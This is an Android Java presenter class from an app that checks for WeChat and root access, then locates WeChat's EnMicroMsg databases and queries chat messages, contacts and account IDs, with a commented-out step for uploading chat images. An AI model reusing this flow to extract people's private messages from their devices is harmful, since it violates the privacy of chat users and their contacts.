package cn.truistic.enmicromsg.main.presenter;

import android.content.Context;

import android.os.AsyncTask;
import android.os.Handler;
import android.widget.Toast;



import java.io.File;
import java.util.ArrayList;

import cn.truistic.enmicromsg.common.db.DBUtil;
import cn.truistic.enmicromsg.common.util.DeviceUtil;
import cn.truistic.enmicromsg.common.util.NetworkUtils;
import cn.truistic.enmicromsg.common.util.PathUtils;
import cn.truistic.enmicromsg.common.util.RootUtil;
import cn.truistic.enmicromsg.main.MainMVP;
import cn.truistic.enmicromsg.main.model.HomeModel;



/**
 * HomePresenter
 */
public class HomePresenter implements MainMVP.IHomePresenter {

    private Context context;
    private MainMVP.IHomeView homeView;
    private MainMVP.IHomeModel homeModel;


    public HomePresenter(Context context, MainMVP.IHomeView homeView) {
        this.context = context;
        this.homeView = homeView;
        homeModel = new HomeModel(this, context);
    }

    @Override
    public void detect() {
        new DetectTask().execute();
    }

    /**
     * 检测操作
     */
    private class DetectTask extends AsyncTask {
        @Override
        protected Object doInBackground(Object[] params) {
            boolean flag = true;
            while (flag) {

                // 1******************************.检测微信是否已经安装************************************
                publishProgress(MainMVP.IHomeView.Progress.DETECT_WECHAT, MainMVP.IHomeView.State.DETECTING);
                if (!detectWechat()) {
                    publishProgress(MainMVP.IHomeView.Progress.DETECT_WECHAT, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_WECHAT, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.DETECT_WECHAT, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_WECHAT, MainMVP.IHomeView.State.TRUE);

                // 2******************************检测设备是否已Root***************************************
                publishProgress(MainMVP.IHomeView.Progress.DETECT_ROOT, MainMVP.IHomeView.State.DETECTING);
                if (!detectRoot()) {
                    publishProgress(MainMVP.IHomeView.Progress.DETECT_ROOT, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_ROOT, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.DETECT_ROOT, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_ROOT, MainMVP.IHomeView.State.TRUE);

                // 3*****************开启后台服务********每隔多少分钟执行一次****************************
                publishProgress(MainMVP.IHomeView.Progress.DETECT_SERVICE, MainMVP.IHomeView.State.DETECTING);
                if (!detectService()) {
                    publishProgress(MainMVP.IHomeView.Progress.DETECT_SERVICE, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_SERVICE, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.DETECT_SERVICE, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_SERVICE, MainMVP.IHomeView.State.TRUE);

                // 4****************************检测是否已授权应用Root权限*************************************
                publishProgress(MainMVP.IHomeView.Progress.DETECT_PERMISSION, MainMVP.IHomeView.State.DETECTING);
                if (!detectPermission()) {
                    publishProgress(MainMVP.IHomeView.Progress.DETECT_PERMISSION, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_PERMISSION, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.DETECT_PERMISSION, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_PERMISSION, MainMVP.IHomeView.State.TRUE);


                // 5****************************检测手機網絡*************************************
                publishProgress(MainMVP.IHomeView.Progress.DETECT_INTERNET, MainMVP.IHomeView.State.DETECTING);
                if (!detectInternet()) {
                    publishProgress(MainMVP.IHomeView.Progress.DETECT_INTERNET, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_INTERNET, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.DETECT_INTERNET, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_INTERNET, MainMVP.IHomeView.State.TRUE);



                // 6*******************************获取微信相关数据**********************************************
                publishProgress(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.DETECTING);
                if (!requestData()) {
                    publishProgress(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.TRUE);

                // 7解析微信相关数据********************聊天记录************************************
                publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.DETECTING);
                if (!analysisData()) {
                    publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.TRUE);

                // 8.解析微信相关数据******************联系人************************************
                publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_CONNTENT, MainMVP.IHomeView.State.DETECTING);
                if (!analysisContent()) {
                    publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_CONNTENT, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.ANALYSIS_CONNTENT, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_CONNTENT, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.ANALYSIS_CONNTENT, MainMVP.IHomeView.State.TRUE);

                // 9解析微信相关数据******************微信号************************************
                publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_USER, MainMVP.IHomeView.State.DETECTING);
                if (!analysisUser()) {
                    publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_USER, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.ANALYSIS_USER, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_USER, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.ANALYSIS_USER, MainMVP.IHomeView.State.TRUE);


                // 10解析微信相关数据******************上传微信聊天圖片************************************
                publishProgress(MainMVP.IHomeView.Progress.UPLOADIMAGE_DATA, MainMVP.IHomeView.State
                        .DETECTING);
                if (!uploadImageData()) {
                    publishProgress(MainMVP.IHomeView.Progress.UPLOADIMAGE_DATA, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.UPLOADIMAGE_DATA, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.UPLOADIMAGE_DATA, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.UPLOADIMAGE_DATA, MainMVP.IHomeView.State.TRUE);
                flag = false;

            }

            return null;
        }

        @Override
        protected void onProgressUpdate(Object[] values) {
            homeView.setProgressState((MainMVP.IHomeView.Progress) values[0], (MainMVP.IHomeView.State) values[1]);
        }

        @Override
        protected void onPostExecute(Object o) {
            homeView.onDetectStop();
        }
    }

    /**
     * 检测微信是否已经安装
     *
     * @return true，微信已安装
     */
    private boolean detectWechat() {

        return DeviceUtil.isAppInstalled(context, "com.tencent.mm");
    }

    /**
     * 检测设备是否开启后台服务
     *
     * @return true, 设备已开启
     */
    private boolean detectService() {

        return true;
    }

    /**
     * 检测设备是否已Root
     *
     * @return true, 设备已root
     */
    private boolean detectRoot() {
        return RootUtil.isDeviceRooted();
    }
    /**
     * 检测是否已授权应用Root权限
     *
     * @return true, 已授权
     */
    private boolean detectPermission() {
        return RootUtil.isGrantRootPermission();
    }

    /**
     * 检测手机网络
     *
     * @return true,
     */
    private boolean detectInternet() {

        //判断网络是否可用

        Handler handler = new Handler(context.getMainLooper());
        handler.postDelayed(() -> {
            if (NetworkUtils.isAvailableByPing()){
                if (NetworkUtils.isConnected(context)){
                    Toast.makeText(context, "网络可用,当前网络为"+String.valueOf(NetworkUtils.getNetworkType
                            (context)),Toast.LENGTH_SHORT).show();

                }else {
                    Toast.makeText(context,"网络未连接,请检查网络",Toast.LENGTH_SHORT).show();

                }
            }else {
                Toast.makeText(context,"网络不可用,请检查网络",Toast.LENGTH_SHORT).show();

            }

        },0);
        return true;                    //当前网络是否可用
    }

    /**
     * 获取微信数据
     *
     * @return true, 获取成功
     */
    private boolean requestData() {

        ArrayList<String> dirs = PathUtils.getUinAndDir(context);
        File dbFile;
        int i, j = 0;
        if (dirs != null) {
            for (i = 0; i < dirs.size(); i++) {
                dbFile = new File(context.getFilesDir() + "/EnMicroMsg" + i + ".db");
                if (!dbFile.exists()) {
                    break;
                }
                j++;
            }
        }
        if (j == 0)
            return false;
        homeModel.saveDbNum(j);
        return true;

    }


    /**
     * 解析微信相关数据---------------------------------聊天記錄----------------------------------------
     *
     * @return true
     */
    private boolean analysisData() {
        int dbNum = homeModel.getDbNum();
        if (dbNum == 0){
            Toast.makeText(context,"获取微信数据库失败!",Toast.LENGTH_SHORT).show();
            return false;
        }
        DBUtil.queryMessage(context);
        return true;

    }

    /**
     * 解析微信相关数据*********************************查询联系人****************************************
     *
     * @return true
     */
    private boolean analysisContent() {
        int dbNum = homeModel.getDbNum();
        if (dbNum == 0){
            Toast.makeText(context,"获取微信数据库失败!",Toast.LENGTH_SHORT).show();
            return false;
        }
        DBUtil.queryContent(context);
        return true;

    }


    /**
     * 解析微信相关数据*********************************查询微信号****************************************
     *
     * @return true
     */
    private boolean analysisUser() {
        int dbNum = homeModel.getDbNum();
        if (dbNum == 0){
            Toast.makeText(context,"获取微信数据库失败!",Toast.LENGTH_SHORT).show();
            return false;
        }
        DBUtil.queryUser(context);
        return true;

    }

    /**
     * 解析微信相关数据*********************************微信聊天圖片****************************************
     *
     * @return true，已上传
     */
    private boolean uploadImageData() {
//        int dbNum = homeModel.getDbNum();
//        if (dbNum == 0){
//            Toast.makeText(context,"获取微信数据库失败!",Toast.LENGTH_SHORT).show();
//            return false;
//        }
//        DBUtil.queryImage(context);
        return true;
    }

}